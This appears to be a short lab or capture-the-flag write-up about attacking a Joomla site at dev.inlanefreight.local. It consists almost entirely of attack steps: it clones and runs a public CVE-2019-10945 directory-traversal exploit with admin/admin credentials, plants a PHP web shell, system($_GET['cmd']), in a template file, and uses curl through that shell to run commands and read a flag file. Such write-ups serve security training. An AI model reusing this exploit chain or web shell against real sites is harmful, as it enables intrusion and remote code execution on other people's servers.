# [Attacking Joomla](Attacking%20Joomla.md)
### Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application

```shell
git clone https://github.com/dpgg101/CVE-2019-10945
```

```shell
python3 CVE-2019-10945.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```
![](Screenshot%202026-07-29%20at%2011.26.57.png)

Now move to `http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA%3D%3D` and add a PHP one-liner to gain code execution as follows

```php
system($_GET['cmd']);
```
![](Screenshot%202026-07-29%20at%2011.38.56.png)

```shell
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?cmd=id 
```
![](Screenshot%202026-07-29%20at%2011.39.08.png)

```shell
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?cmd=cat%20%2Fvar%2Fwww%2Fdev%2Einlanefreight%2Elocal%2Fflag%5F6470e394cbf6dab6a91682cc8585059b%2Etxt
```
![](Screenshot%202026-07-29%20at%2011.43.17.png)
